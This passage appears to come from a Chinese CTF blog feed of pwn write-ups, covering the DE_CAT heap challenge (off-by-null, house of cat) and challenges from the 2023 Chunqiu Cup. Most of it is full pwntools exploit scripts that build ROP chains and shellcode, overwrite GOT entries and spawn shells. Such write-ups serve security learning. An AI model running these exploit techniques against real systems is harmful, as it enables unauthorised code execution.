class="hljs-string">&#x27;your index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    login()<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;your content:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    login()<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    a = fun.rand() % <span class="hljs-number">10</span><br>    b = fun.rand() % <span class="hljs-number">10</span><br>    c = fun.rand() % <span class="hljs-number">10</span><br>    d = fun.rand() % <span class="hljs-number">10</span><br><br>    num = a * <span class="hljs-number">1000</span> + b * <span class="hljs-number">100</span> + c * <span class="hljs-number">10</span> + d<br>    p.sendlineafter(<span class="hljs-string">&#x27;please input your number:&#x27;</span>, <span class="hljs-built_in">str</span>(num))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    attack()<br><br>    add(<span class="hljs-number">8</span>, <span class="hljs-number">0xb460</span>)<span class="hljs-comment"># 使fake chunk的倒数第二个字节为&#x27;\x00&#x27;,需要爆破,1/16成功率</span><br><br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x4f0</span>)<br>    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">6</span>,<span class="hljs-number">0x80</span>)<br><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">5</span>)<br><br>    delete(<span class="hljs-number">2</span>)<br><br>    fake_size = <span class="hljs-number">0x461</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x470</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x450</span> + p64(<span class="hljs-number">0</span>) + p16(fake_size))<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x430</span>)<br><br>    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x450</span>)<br><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">3</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x430</span>)<br><br>    delete(<span class="hljs-number">5</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">7</span>, <span class="hljs-number">0x1000</span>)<br>    add(<span class="hljs-number">5</span>, <span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x438</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x430</span> + p64(<span class="hljs-number">0x460</span>))<br><br>    delete(<span class="hljs-number">4</span>)   <span class="hljs-comment"># trigger</span><br><br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">6</span>)<br><br>    add(<span class="hljs-number">6</span>, <span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x100</span>)<br>    add(<span class="hljs-number">4</span>, <span class="hljs-number">0x100</span>)<br><br>    edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>    show(<span class="hljs-number">1</span>)<br><br>    libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecbe0</span><br>    lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    edit(<span class="hljs-number">3</span>, p64(free_hook - <span class="hljs-number">8</span>))<br><br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x100</span>)<br>    add(<span class="hljs-number">4</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system))<br><br>    <span class="hljs-comment"># dbg(command)</span><br><br>    delete(<span class="hljs-number">4</span>)<br><br>    p.interactive()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            p = process(fn)<br>            pwn()<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p><img src="/img/2023-Syctf/image-20230709170824876.png" alt="image-20230709170824876"></p><p>Tips：</p><p>实际上，压根不需要这么复杂的堆风水。由于我们可以很容易泄露出libc地址与堆地址，直接就可以通过伪造过掉unlink的检查。</p><h2 id="DE-CAT"><a href="#DE-CAT" class="headerlink" title="DE_CAT"></a>DE_CAT</h2><p>查看保护</p><p><img src="/img/2023-Syctf/image-20230709170017377.png" alt="image-20230709170017377"></p><p>保护全开。</p><p>题目就是常规的菜单堆题。</p><p>edit函数存在off-by-null漏洞。</p><p><img src="/img/2023-Syctf/image-20230709170840699.png" alt="image-20230709170840699"></p><p>show函数几乎没有任何限制的可以泄露出libc地址与堆地址。</p><p><img src="/img/2023-Syctf/image-20230709170854074.png" alt="image-20230709170854074"></p><p>这道题是libc-2.35的off-by-null，采用伪造fake_chunk的方式，可以直接过掉unlink检查。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = heap_base + <span class="hljs-number">0x1800</span><br>fake_size = <span class="hljs-number">0x4a0</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x80</span>: [<span class="hljs-number">0</span>, fake_size, fake_chunk, fake_chunk],<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>edit(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></table></figure><p><img src="/img/2023-Syctf/image-20230709170912800.png" alt="image-20230709170912800"></p><p>题目开了沙盒，接下来就是house of cat一把梭了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./CAT_DE&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content=<span class="hljs-string">&#x27;a&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><br>shellcode = asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_cat</span>(<span class="hljs-params">fake_IO_file_addr</span>):<br>    payload = flat(<br>        &#123;<br>            <span class="hljs-number">0x20</span>: [<br>                    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <br>                    <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                    fake_IO_file_addr+<span class="hljs-number">0x150</span>,    <span class="hljs-comment"># rdx</span><br>                    setcontext + <span class="hljs-number">61</span><br>                ],<br>            <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,    <span class="hljs-comment"># chain</span><br>            <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,   <span class="hljs-comment"># _lock</span><br>            <span class="hljs-number">0x90</span>: fake_IO_file_addr + <span class="hljs-number">0x30</span>,  <span class="hljs-comment"># _IO_wide_data</span><br>            <span class="hljs-number">0xb0</span>: <span class="hljs-number">1</span>,    <span class="hljs-comment"># _mode</span><br>            <span class="hljs-number">0xc8</span>: _IO_wfile_jumps + <span class="hljs-number">0x30</span>,   <span class="hljs-comment"># fake_IO_wide_jumps</span><br>            <span class="hljs-number">0x100</span>: fake_IO_file_addr + <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0x140</span>: &#123;<br>                <span class="hljs-number">0xa0</span>: [fake_IO_file_addr + <span class="hljs-number">0x210</span>, ret]<br>            &#125;,<br>            <span class="hljs-number">0x200</span>: [<br>                pop_rdi_ret, fake_IO_file_addr &gt;&gt; <span class="hljs-number">12</span> &lt;&lt; <span class="hljs-number">12</span>,<br>                pop_rsi_ret, <span class="hljs-number">0x1000</span>,<br>                pop_rdx_rbx_ret, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>,<br>                pop_rax_ret, <span class="hljs-number">10</span>,    <span class="hljs-comment"># mprotect</span><br>                syscall_ret,<br>                fake_IO_file_addr+<span class="hljs-number">0x300</span>+<span class="hljs-number">0x10</span>,<br>            ],<br>            <span class="hljs-number">0x300</span>: shellcode,<br>        &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">return</span> payload<br><br>add(<span class="hljs-number">0x420</span>)  <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x90</span>)  <span class="hljs-comment"># 1</span><br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x1000</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x420</span>)  <span class="hljs-comment"># 2</span><br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a000</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>p.recv(<span class="hljs-number">10</span>)<br><br>heap_base = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>, heap_base)<br><br>key = (heap_base &gt;&gt; <span class="hljs-number">12</span>) + <span class="hljs-number">1</span><br><br>_IO_list_all = libc_base + <span class="hljs-number">0x21a680</span><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x21ba80</span><br>_IO_wfile_jumps = libc_base + <span class="hljs-number">0x2160c0</span><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x0000000000090529</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000045eb0</span><br>syscall_ret = libc_base + <span class="hljs-number">0x0000000000091396</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br><br>add(<span class="hljs-number">0x420</span>)  <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0xf8</span>)   <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x4f8</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0xf8</span>)   <span class="hljs-comment"># 6</span><br><br>fake_chunk = heap_base + <span class="hljs-number">0x1800</span><br>fake_size = <span class="hljs-number">0x4a0</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x80</span>: [<span class="hljs-number">0</span>, fake_size, fake_chunk, fake_chunk],<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>edit(<span class="hljs-number">3</span>, payload)<br><br>edit(<span class="hljs-number">4</span>, flat(&#123;<span class="hljs-number">0xf0</span>: fake_size&#125;))<br><br>delete(<span class="hljs-number">5</span>)   <span class="hljs-comment"># trigger</span><br><br>delete(<span class="hljs-number">6</span>)<br>delete(<span class="hljs-number">4</span>)<br><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 4 </span><br><br>edit(<span class="hljs-number">4</span>, flat(&#123;<span class="hljs-number">0x390</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x101</span>, key ^ _IO_list_all]&#125;))<br><br>add(<span class="hljs-number">0xf0</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0xf0</span>, p64(fake_chunk)) <span class="hljs-comment"># 6</span><br><br>payload = house_of_cat(fake_chunk)<br>edit(<span class="hljs-number">4</span>, payload)<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-number">5</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/2023-Syctf/image-20230709170239457.png" alt="image-20230709170239457"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-春秋杯pwn-wp</title>
    <link href="/2023/05/23/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/"/>
    <url>/2023/05/23/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-春秋杯pwn-wp"><a href="#2023-春秋杯pwn-wp" class="headerlink" title="2023-春秋杯pwn-wp"></a>2023-春秋杯pwn-wp</h1><p>一共六道题，比赛期间做出来4道，排名92。</p><p>babyaul那道题纯属不太会，three-boy那道题主要是最后一天排名落后了，就不太想做了。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230709173316006.png" alt="image-20230709173316006"></p><h2 id="p2048"><a href="#p2048" class="headerlink" title="p2048"></a>p2048</h2><p>题目是一个小游戏，有点怪怪的。玩通关即可获取shell。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214025865.png" alt="image-20230711214025865"></p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214056559.png" alt="image-20230711214056559"></p><h2 id="easy-LzhiFTP-CHELL"><a href="#easy-LzhiFTP-CHELL" class="headerlink" title="easy_LzhiFTP_CHELL"></a>easy_LzhiFTP_CHELL</h2><p>查看保护。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711211521146.png" alt="image-20230711211521146"></p><p>程序设置伪随机数作为登录密码。</p><p>程序存在格式化字符串漏洞，可以泄露程序基地址。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711212001764.png" alt="image-20230711212001764"></p><p>程序分配时，多分配一次造成溢出。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711212246800.png" alt="image-20230711212246800"></p><p>覆盖free的got表为system_plt。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./easy_LzhiFTP&#x27;</span><br>libc_name = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>elf = ELF(fn)<br>libc = ELF(libc_name)<br>fun = cdll.LoadLibrary(libc_name)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;47.94.224.3&#x27;</span>, <span class="hljs-number">14136</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">cont</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;IMLZH1-FTP&gt; &#x27;</span>, cont)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touch</span>(<span class="hljs-params">filename, content=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span></span>):<br>    menu(<span class="hljs-string">b&#x27;touch &#x27;</span> + filename)<br>    p.sendafter(<span class="hljs-string">&#x27;Context:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-string">&#x27;edit&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-string">&#x27;del&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():<br>    menu(<span class="hljs-string">&#x27;cat&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ls</span>():<br>    menu(<span class="hljs-string">&#x27;ls&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bye</span>():<br>    menu(<span class="hljs-string">&#x27;bye&#x27;</span>)<br><br><br>fun.srand(<span class="hljs-number">100</span>)<br>pwd = fun.rand() % <span class="hljs-number">115</span> * fun.rand() % <span class="hljs-number">200</span><br>pwd = <span class="hljs-number">0x72</span><br><br>p.sendafter(<span class="hljs-string">&#x27;Username: &#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>.ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>p.sendafter(<span class="hljs-string">&#x27;Password: &#x27;</span>, p32(pwd))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;(yes/No)&#x27;</span>, <span class="hljs-string">&#x27;No%19$p&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Your Choice:No&#x27;</span>)<br>codebase = (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) &amp; ~<span class="hljs-number">0xfff</span>) - <span class="hljs-number">0x1000</span><br>lg(<span class="hljs-string">&#x27;codebase&#x27;</span>, codebase)<br><br>file_name = codebase + <span class="hljs-number">0x4A80</span><br>files = codebase + <span class="hljs-number">0x4b00</span><br><br>system_plt = codebase + elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = codebase + elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    touch(<span class="hljs-string">b&#x27;flag&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br><br>touch(p64(files + <span class="hljs-number">0x10</span>), <span class="hljs-string">&#x27;\x00&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, p64(free_got))<br><br>edit(<span class="hljs-number">2</span>, p64(system_plt))<br><br><span class="hljs-comment"># dbg()</span><br><br>delete(<span class="hljs-number">4</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711213046085.png" alt="image-20230711213046085"></p><h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>检查保护。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214247788.png" alt="image-20230711214247788"></p><p>分配一段可读可写可执行的地址。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214628801.png" alt="image-20230711214628801"></p><p>玩游戏刷钱。也就是1~4位md5值爆破。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711214810610.png" alt="image-20230711214810610"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 